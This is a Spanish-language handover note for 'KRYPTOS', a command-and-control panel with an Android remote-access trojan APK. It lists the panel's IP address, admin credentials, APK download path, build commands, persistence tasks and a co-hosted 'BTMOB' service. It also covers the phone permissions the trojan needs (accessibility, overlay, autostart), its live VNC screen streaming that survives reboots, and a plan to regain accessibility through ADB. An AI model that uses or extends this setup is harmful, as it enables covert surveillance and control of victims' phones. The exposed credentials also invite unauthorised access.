# KRYPTOS - NOTAS DE ENTREGA

Fecha: 2026-10-22
Estado: TERMINADO Y PROBADO

## 1. QUE ES
Panel C&C (FastAPI) + APK Android. Puerto del panel: 7771.

## 2. ACCESOS
- Panel: http://82.39.109.120:7771
- Usuario: admin
- Password: F1F2F3F4F5.123
- APK: http://82.39.109.120:7771/web/rat-app.apk

## 3. PUERTOS - REGLA DE ORO
- 7771 = KRYPTOS (panel). Nuestro.
- 8080 y 3000 = BTMOB (WS node bajo pm2). NO TOCAR.
- 80 = BTMOB (IIS/PHP). NO TOCAR.
- 3306 = MySQL (BTMOB). NO TOCAR.
- 3389 = RDP.

## 4. TAREAS PROGRAMADAS (arrancan solas al bootear)
- GangstarServerWatchdog: corre server/watchdog.py con el python del venv.
  Revisa /health cada 15s y revive el 7771 si esta caido. NO toca el 8080.
- BTMOB_WS_Autostart: corre pm2 resurrect para levantar el WS de BTMOB.

## 5. COMANDOS UTILES (en el VPS)
Salud del panel:
  try { (Invoke-WebRequest http://127.0.0.1:7771/health -UseBasicParsing -TimeoutSec 8).StatusCode } catch { $_.Exception.Message }
Quien escucha:
  Get-NetTCPConnection -LocalPort 7771 -State Listen
  Get-NetTCPConnection -LocalPort 8080,3000,80 -State Listen
Levantar BTMOB:
  & "$env:APPDATA\npm\pm2.cmd" resurrect
Reiniciar el panel:
  Stop-ScheduledTask -TaskName GangstarServerWatchdog
  Start-ScheduledTask -TaskName GangstarServerWatchdog

## 6. COMPILAR EL APK
En el VPS:
  cd C:\Users\Administrator\Desktop\kryptos_vps\android-rat
  build_apk.bat
El APK queda en server\web\rat-app.apk

## 7. CODIGO FUENTE
- PC: C:\Users\user\kryptos (git, tag v1.0-entrega)
- VPS: C:\Users\Administrator\Desktop\kryptos_vps (recibe y compila)
- Backups: C:\Users\Administrator\Desktop\kryptos_vps_BACKUP_*

## 8. REQUISITOS EN EL TELEFONO
- Accesibilidad ACTIVADA
- Aparecer encima de otras apps ACTIVADO
- Permisos: Mostrar ventanas emergentes en segundo plano ACTIVADO
- Bateria: Sin restricciones
- Autostart ACTIVADO (el boton CONFIGURE_ROM lo hace solo)

## 9. RENDIMIENTO MEDIDO (VNC)
- Antes: 0.39 FPS, frames de 191 KB
- Ahora: 22-24 FPS, frames de ~20 KB, ~4 Mbps
- Via MediaProjection (ScreenStreamService) + calidad 45 + 300x557
- El VNC se reanuda solo tras reiniciar el telefono.

## 10. NOTAS
- MIUI: al activar autostart el sistema reinicia el proceso y se cae la accesibilidad.
  La app tiene AccessibilityKeeper que intenta recuperarla.
  Mejora pendiente: WRITE_SECURE_SETTINGS por ADB para auto-recuperacion.
- El frontend vive en server/web-dist (build de Vite).
- La calidad del VNC se ajusta en vivo desde el panel (tope 45).
